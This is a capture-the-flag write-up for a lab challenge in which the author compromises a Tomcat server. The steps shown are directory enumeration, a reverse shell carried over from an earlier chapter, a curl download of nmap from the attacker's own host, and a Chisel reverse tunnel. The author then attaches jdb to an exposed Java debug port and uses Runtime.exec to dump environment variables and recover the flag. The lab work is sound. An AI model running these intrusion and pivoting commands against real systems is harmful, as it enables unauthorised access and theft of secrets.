# Chapter 3: Bounded

## Challenge

Hi, TCC-CSIRT analyst,

Do you know the feeling when, after a demanding shift, you fall into lucid dreaming and even in your sleep, you encounter tricky problems? Help a colleague solve tasks in the complex and interconnected world of LORE, where it is challenging to distinguish reality from fantasy.

The entry point to LORE is at `http://intro.lore.tcc`.

See you in the next incident!

Hint: Be sure you enter the flag for the correct chapter.

Hint: In this realm, challenges should be conquered in a precise order, and to triumph over some, you'll need artifacts acquired from others - a unique twist that defies the norms of typical CTF challenges.

Hint: All systems related to Chapter 3 restart on failed health checks (every 5 minutes).

## Solution

### 1. Entry Point Discovery

The entry point for Chapter 3 is located at: `http://jgames.lore.tcc/`.

The site displays a **Tic-Tac-Toe** game from the following repository:  
[Tic Tac Toe GitHub](https://github.com/arringtonm/tictactoe).

### 2. Enumerating the Site

Using `feroxbuster`, we enumerated the site for hidden directories:

```bash
feroxbuster -u http://jgames.lore.tcc/

302      GET        0l        0w        0c http://jgames.lore.tcc/manager => http://jgames.lore.tcc/manager/
```

We checked the `/manager/` directory, but it returned the following message:

```
You are not authorized to view this page.

By default, the Manager is only accessible from a browser running on the same machine as Tomcat. If you wish to modify this restriction, you'll need to edit the Manager's context.xml file.
```

This confirmed that the server was running Apache Tomcat, but the Manager was inaccessible.

### 3. Using Access Gained in Chapter 2

Based on the hint, we leveraged the reverse shell we gained in Chapter 2 to enumerate the internal network.

First, we downloaded `nmap` to the machine from our own server using curl:

```bash
curl -o nmap http://10.200.0.57/nmap
chmod 0777 nmap
```

Then, using `ip addr`, we determined the internal network range (`192.168.73.1-255`) and scanned for active machines.

The scan revealed that jgames was running at `192.168.73.110`:

```bash
./nmap 192.168.73.110 -p1-65535
PORT     STATE SERVICE
5005/tcp open  unknown
8080/tcp open  http-alt
```

### 4. Exploiting the Java Debugger Port (5005)

Port 5005 is the Java Debugger (JDB) port, which was open. To access this port, we set up a reverse proxy using Chisel, which was already installed on the machine.

We started the Chisel server locally:

```bash
chisel server -p 8000 --reverse
```

Then, on the compromised machine from Chapter 2 (**pimpam**), we ran:

```bash
chisel client 10.200.0.57:8000 R:5005:192.168.73.110:5005
```

This allowed us to connect to the remote machine's port 5005 locally.

Next, we attached (locally) jdb to port 5005:

```bash
jdb -attach 5005
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> 
```

JDB successfully attached!

### 5. Exploiting Tomcat via JDB

Using the `classes` command, we listed the loaded classes. After some attempts, we found a class where we could set a breakpoint to trigger command execution:

We set a breakpoint at:

```
stop in org.apache.tomcat.util.collections.SynchronizedQueue.size()
```

Once the breakpoint was hit, we executed a command to read environment variables:

```
print (new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("env").getInputStream())).lines().collect(java.util.stream.Collectors.joining(java.lang.System.lineSeparator())))
```

After executing the command, the environment variables were printed, and we found the flag.

## Flag

```
FLAG=FLAG{ijBw-pfxY-Scgo-GJKO}
```

## Note

The challenge was unstable, as the server restarted every 5 minutes (as indicated by the hint). This caused the IP address of the server to change after each restart, meaning we had to re-enumerate and repeat the process to regain access.
